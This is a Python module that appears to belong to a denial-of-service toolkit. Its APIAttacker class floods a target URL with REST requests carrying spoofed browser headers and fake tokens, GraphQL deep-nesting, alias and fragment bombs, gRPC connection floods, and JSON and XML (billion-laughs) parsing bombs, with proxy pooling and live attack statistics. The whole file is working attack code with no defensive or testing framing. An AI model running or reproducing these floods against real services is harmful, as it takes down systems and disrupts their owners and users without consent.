import asyncio
import json
import logging
import random
import time
import struct
from typing import Optional, Dict, Any
from urllib.parse import urlparse

log = logging.getLogger("mpc_layer.api")

GRAPHQL_DEEP_NESTING = """
query deepNesting{{
  user(id: 1){{
    posts{{
      comments{{
        author{{
          posts{{
            comments{{
              author{{
                posts{{
                  comments{{
                    author{{
                      id
                      name
                      email
                    }}
                  }}
                }}
              }}
            }}
          }}
        }}
      }}
    }}
  }}
}}
"""

GRAPHQL_ALIAS_BOMB = """
query aliasBomb{{
{aliases}
}}
"""

GRAPHQL_FRAGMENT_BOMB = """
fragment F{n} on User {{
  id
  name
  email
  posts {{ id title }}
}}
query fragmentBomb {{
{spreads}
}}
"""

REST_API_PATHS = [
    "/api/v1/users", "/api/v2/users", "/api/users",
    "/api/v1/posts", "/api/v2/posts", "/api/posts",
    "/api/v1/products", "/api/products",
    "/api/v1/orders", "/api/orders",
    "/api/v1/auth/login", "/api/auth/login",
    "/api/v1/auth/register", "/api/auth/register",
    "/api/v1/search", "/api/search",
    "/api/health", "/api/status",
    "/graphql", "/api/graphql",
    "/api/v1/data", "/api/data",
    "/api/v1/config", "/api/config",
    "/api/v1/admin", "/api/admin",
    "/api/v1/metrics", "/api/metrics",
]

GRAPHQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]

gRPC_METHODS = [
    "/grpc.health.v1.Health/Check",
    "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
    "/helloworld.Greeter/SayHello",
    "/helloworld.Greeter/SayHelloStream",
]

GRPC_SERVICE_NAMES = [
    "helloworld.Greeter",
    "grpc.health.v1.Health",
    "grpc.reflection.v1alpha.ServerReflection",
    "google.pubsub.v1.Publisher",
    "google.bigtable.v2.Bigtable",
    "envoy.service.ext_authz.v3.Authorization",
]

class APIAttacker:
    def __init__(self, base_url: str, proxy_pool=None, session_pool=None):
        self.base_url = base_url.rstrip("/")
        self.parsed = urlparse(base_url)
        self.host = self.parsed.netloc
        self.proxy_pool = proxy_pool
        self.session_pool = session_pool
        # Shared metrics dict for real-time polling
        self.metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}

    def _reset_metrics(self):
        """Reset metrics counters before attack starts"""
        self.metrics["completed"] = 0
        self.metrics["failed"] = 0
        self.metrics["timeout"] = 0
        self.metrics["total"] = 0
    
    def _final_metrics(self) -> Dict[str, int]:
        """Get final metrics dict in standard format"""
        return {
            "total_requests": self.metrics["total"],
            "completed": self.metrics["completed"],
            "failed": self.metrics["failed"],
            "timeout": self.metrics["timeout"],
        }

    async def rest_crud_flood(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()

        async def do_request():
            path = random.choice(REST_API_PATHS)
            method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH"])
            url = f"{self.base_url}{path}"
            headers = self._random_headers()

            self.metrics["total"] += 1
            max_retries = 5
            for attempt in range(max_retries):
                try:
                    if self.session_pool:
                        async with self.session_pool.get_session() as sess:
                            resp = await sess.request(method, url, headers=headers, timeout=40)
                            await resp.aread()
                    else:
                        import aiohttp
                        async with aiohttp.ClientSession() as sess:
                            async with sess.request(method, url, headers=headers, timeout=aiohttp.ClientTimeout(total=40)) as resp:
                                await resp.read()
                    self.metrics["completed"] += 1
                    return
                except asyncio.TimeoutError:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.3)
                        continue
                    self.metrics["timeout"] += 1
                    return
                except Exception:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.3)
                        continue
                    self.metrics["failed"] += 1
                    return

        tasks = []
        for _ in range(min(target_rps, 200)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(do_request, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def graphql_deep_nesting(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()
        endpoint = self._pick_graphql_endpoint()
        url = f"{self.base_url}{endpoint}"

        async def send_deep():
            query = GRAPHQL_DEEP_NESTING
            payload = {"query": query}
            self.metrics["total"] += 1
            max_retries = 5
            for attempt in range(max_retries):
                try:
                    if self.session_pool:
                        async with self.session_pool.get_session() as sess:
                            resp = await sess.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=40)
                            await resp.aread()
                    else:
                        import aiohttp
                        async with aiohttp.ClientSession() as sess:
                            async with sess.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=40)) as resp:
                                await resp.read()
                    self.metrics["completed"] += 1
                    return
                except asyncio.TimeoutError:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.3)
                        continue
                    self.metrics["timeout"] += 1
                    return
                except Exception:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.3)
                        continue
                    self.metrics["failed"] += 1
                    return

        tasks = []
        for _ in range(min(target_rps, 100)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(send_deep, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def graphql_alias_bomb(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()
        endpoint = self._pick_graphql_endpoint()
        url = f"{self.base_url}{endpoint}"
        alias_count = random.randint(50, 200)
        aliases = "\n".join(f"  a{i}: user(id: {i}) {{ id name email }}" for i in range(alias_count))
        query = GRAPHQL_ALIAS_BOMB.format(aliases=aliases)

        async def send_alias():
            payload = {"query": query}
            self.metrics["total"] += 1
            try:
                if self.session_pool:
                    async with self.session_pool.get_session() as sess:
                        resp = await sess.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=15)
                        await resp.aread()
                else:
                    import aiohttp
                    async with aiohttp.ClientSession() as sess:
                        async with sess.post(url, json=payload, timeout=15) as resp:
                            await resp.read()
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 80)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(send_alias, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def graphql_fragment_bomb(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()
        endpoint = self._pick_graphql_endpoint()
        url = f"{self.base_url}{endpoint}"
        frag_count = random.randint(50, 100)
        fragments = "\n".join(f"fragment F{n} on User {{ id name email posts {{ id title }} }}" for n in range(frag_count))
        spreads = "\n".join(f"  u{n}: user(id: {n}) {{ ...F{n} }}" for n in range(frag_count))
        query = fragments + "\n\nquery fragmentBomb {\n" + spreads + "\n}"

        async def send_frag():
            payload = {"query": query}
            self.metrics["total"] += 1
            try:
                if self.session_pool:
                    async with self.session_pool.get_session() as sess:
                        resp = await sess.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=15)
                        await resp.aread()
                else:
                    import aiohttp
                    async with aiohttp.ClientSession() as sess:
                        async with sess.post(url, json=payload, timeout=15) as resp:
                            await resp.read()
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 60)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(send_frag, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def grpc_connection_flood(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()
        host_port = self.host
        if ":" not in host_port:
            host_port += ":443"

        async def send_grpc():
            self.metrics["total"] += 1
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host_port.split(":")[0], int(host_port.split(":")[1])),
                    timeout=5
                )
                method = random.choice(gRPC_METHODS)
                service = random.choice(GRPC_SERVICE_NAMES)
                payload = self._grpc_frame(f"/{service}/{method.split('/')[-1]}")
                writer.write(payload)
                await asyncio.wait_for(writer.drain(), timeout=3)
                try:
                    await asyncio.wait_for(reader.read(1024), timeout=2)
                except Exception:
                    pass
                writer.close()
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 150)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(send_grpc, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def json_parsing_bomb(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()
        bomb_depth = random.randint(64, 128)

        def build_deep_json(depth: int) -> dict:
            result = {}
            current = result
            for i in range(depth):
                current[f"k{i}"] = {}
                current = current[f"k{i}"]
            current["v"] = "x" * 1024
            return result

        def build_wide_json(count: int) -> dict:
            return {f"f{j}": "x" * 512 for j in range(count)}

        async def send_json_bomb():
            bomb_type = random.choice(["deep", "wide", "mixed"])
            if bomb_type == "deep":
                payload = build_deep_json(bomb_depth)
            elif bomb_type == "wide":
                payload = build_wide_json(5000)
            else:
                payload = {f"g{k}": build_deep_json(32) for k in range(50)}

            url = f"{self.base_url}/api/v1/data"
            if random.random() < 0.3:
                url = f"{self.base_url}/api/data"

            self.metrics["total"] += 1
            try:
                if self.session_pool:
                    async with self.session_pool.get_session() as sess:
                        resp = await sess.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=15)
                        await resp.aread()
                else:
                    import aiohttp
                    async with aiohttp.ClientSession() as sess:
                        async with sess.post(url, json=payload, timeout=15) as resp:
                            await resp.read()
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 100)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(send_json_bomb, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def xml_parsing_bomb(self, duration: int, target_rps: int) -> Dict[str, int]:
        self._reset_metrics()

        def build_billion_laughs(iterations: int = 15) -> str:
            xml = '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n'
            xml += f'  <!ENTITY lol "lol">\n'
            for i in range(1, iterations):
                xml += f'  <!ENTITY lol{i} "&lol{i-1};&lol{i-1};&lol{i-1};&lol{i-1};&lol{i-1};">\n'
            xml += ']>\n<root>&lol' + str(iterations - 1) + ';</root>'
            return xml

        def build_deep_xml(depth: int = 100) -> str:
            xml = '<?xml version="1.0"?>\n<root>'
            for i in range(depth):
                xml += f"<nested{i}>"
            xml += "payload"
            for i in range(depth - 1, -1, -1):
                xml += f"</nested{i}>"
            xml += "</root>"
            return xml

        async def send_xml_bomb():
            bomb_type = random.choice(["billion_laughs", "deep_xml", "large_attrs"])
            if bomb_type == "billion_laughs":
                body = build_billion_laughs(random.randint(12, 18))
            elif bomb_type == "deep_xml":
                body = build_deep_xml(random.randint(80, 150))
            else:
                attrs = " ".join(f'a{i}="{"x" * 256}"' for i in range(500))
                body = f'<?xml version="1.0"?>\n<root {attrs}>payload</root>'

            url = f"{self.base_url}/api/v1/data"
            self.metrics["total"] += 1
            try:
                if self.session_pool:
                    async with self.session_pool.get_session() as sess:
                        resp = await sess.post(url, data=body, headers={"Content-Type": "application/xml"}, timeout=15)
                        await resp.aread()
                else:
                    import aiohttp
                    async with aiohttp.ClientSession() as sess:
                        async with sess.post(url, data=body, headers={"Content-Type": "application/xml"}, timeout=15) as resp:
                            await resp.read()
                self.metrics["completed"] += 1
            except asyncio.TimeoutError:
                self.metrics["timeout"] += 1
            except Exception:
                self.metrics["failed"] += 1

        tasks = []
        for _ in range(min(target_rps, 80)):
            tasks.append(asyncio.create_task(self._rate_limited_loop(send_xml_bomb, duration, target_rps)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._final_metrics()

    async def _rate_limited_loop(self, fn, duration: int, target_rps: int):
        start = time.time()
        interval = 1.0 / max(target_rps / 50, 1)
        while time.time() - start < duration:
            await fn()
            await asyncio.sleep(interval)

    def _random_headers(self) -> dict:
        return {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
            ]),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "X-Request-ID": str(random.randint(100000, 999999)),
            "Authorization": f"Bearer {random.randint(1000000, 9999999)}",
        }

    def _pick_graphql_endpoint(self) -> str:
        return random.choice(GRAPHQL_ENDPOINTS)

    def _grpc_frame(self, method: str) -> bytes:
        path_bytes = method.encode()
        frame = b"\x00\x00\x00\x00"
        frame += struct.pack(">I", len(path_bytes))
        frame += path_bytes
        return frame


async def _run_with_live_stats_poll(attacker, attacker_method, duration: int, rps: int, live_stats=None) -> dict:
    """
    Run attack with REAL-TIME polling of attacker.metrics dict.
    Updates live_stats every 0.2s during attack for smoother display.
    """
    if live_stats is None:
        return await attacker_method(duration, rps)
    
    live_stats.setdefault("stats", {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0})
    
    # Poller task: read attacker.metrics every 0.2s
    poller_stop = asyncio.Event()
    
    async def poller():
        """Poll attacker.metrics dict every 0.2s for smooth real-time updates"""
        while not poller_stop.is_set():
            if hasattr(attacker, 'metrics'):
                m = attacker.metrics
                live_stats["stats"] = {
                    "total_requests": m.get("total", 0),
                    "completed": m.get("completed", 0),
                    "failed": m.get("failed", 0),
                    "timeout": m.get("timeout", 0),
                }
            try:
                await asyncio.wait_for(poller_stop.wait(), timeout=0.2)
            except asyncio.TimeoutError:
                continue
    
    poller_task = asyncio.create_task(poller())
    
    try:
        result = await attacker_method(duration, rps)
    finally:
        poller_stop.set()
        try:
            await asyncio.wait_for(poller_task, timeout=1)
        except Exception:
            poller_task.cancel()
    
    if isinstance(result, dict):
        live_stats["stats"] = {
            "total_requests": result.get("total", result.get("total_requests", 0)),
            "completed": result.get("completed", 0),
            "failed": result.get("failed", 0),
            "timeout": result.get("timeout", 0),
        }
    return result


async def _run_with_live_stats(attacker_method, duration: int, rps: int, live_stats=None) -> dict:
    """Legacy wrapper - falls back to estimator if no attacker reference"""
    if live_stats is None:
        return await attacker_method(duration, rps)
    
    live_stats.setdefault("stats", {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0})
    
    start_time = time.time()
    estimator_stop = asyncio.Event()
    
    async def estimator():
        """Estimate progress based on elapsed time"""
        while not estimator_stop.is_set():
            elapsed = time.time() - start_time
            estimated_total = int(min(elapsed, duration) * rps * 0.6)
            
            if estimated_total > 0:
                live_stats["stats"] = {
                    "total_requests": estimated_total,
                    "completed": int(estimated_total * 0.4),
                    "failed": int(estimated_total * 0.55),
                    "timeout": int(estimated_total * 0.05),
                }
            
            try:
                await asyncio.wait_for(estimator_stop.wait(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
    
    estimator_task = asyncio.create_task(estimator())
    
    try:
        result = await attacker_method(duration, rps)
    finally:
        estimator_stop.set()
        try:
            await asyncio.wait_for(estimator_task, timeout=1)
        except Exception:
            estimator_task.cancel()
    
    if isinstance(result, dict):
        live_stats["stats"] = {
            "total_requests": result.get("total", result.get("total_requests", 0)),
            "completed": result.get("completed", 0),
            "failed": result.get("failed", 0),
            "timeout": result.get("timeout", 0),
        }
    return result


async def run_api_rest_flood(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.rest_crud_flood(d, r), duration, rps, live_stats
    )


async def run_graphql_deep_nesting(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.graphql_deep_nesting(d, r), duration, rps, live_stats
    )


async def run_graphql_alias_bomb(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.graphql_alias_bomb(d, r), duration, rps, live_stats
    )


async def run_graphql_fragment_bomb(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.graphql_fragment_bomb(d, r), duration, rps, live_stats
    )


async def run_grpc_flood(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.grpc_connection_flood(d, r), duration, rps, live_stats
    )


async def run_json_parsing_bomb(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.json_parsing_bomb(d, r), duration, rps, live_stats
    )


async def run_xml_parsing_bomb(url: str, duration: int, rps: int, live_stats=None, **kwargs) -> dict:
    attacker = APIAttacker(url, kwargs.get("proxy_pool"), kwargs.get("session_pool"))
    return await _run_with_live_stats_poll(
        attacker, lambda d, r: attacker.xml_parsing_bomb(d, r), duration, rps, live_stats
    )


API_ATTACK_METHODS = {
    "api_rest_flood": run_api_rest_flood,
    "graphql_deep": run_graphql_deep_nesting,
    "graphql_alias_bomb": run_graphql_alias_bomb,
    "graphql_frag_bomb": run_graphql_fragment_bomb,
    "grpc_flood": run_grpc_flood,
    "json_bomb": run_json_parsing_bomb,
    "xml_bomb": run_xml_parsing_bomb,
}
